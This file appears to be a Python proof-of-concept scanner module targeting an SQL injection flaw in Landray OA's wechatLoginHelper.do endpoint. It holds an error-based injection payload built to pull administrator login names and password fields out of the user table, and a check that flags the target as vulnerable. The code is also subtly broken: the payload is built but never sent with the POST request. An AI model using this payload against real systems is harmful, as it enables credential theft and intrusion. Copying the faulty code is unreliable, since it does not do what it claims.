import requests
import urllib

def verify(url):
    relsult = {
        'name': '蓝凌OA-WechatLoginHelper.do存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.850.132 Safari/537.36',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }
    data = "method=edit&openid=&nickname=&image=&uid=123'and updatexml(1,concat('~',(select concat('~',test.fdLoginName,'~',test.fdPassword,'~') from com.landray.kmss.sys.organization.model.SysOrgPerson test where test.fdLoginName like '%25admin12%25'),'~'),1)=1-- '"
    vurl = urllib.parse.urljoin(url, "/third/wechat/wechatLoginHelper.do")
    try:
        response = requests.post(vurl, headers=headers)
        if response.status_code == 200 and 'nvarchar' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult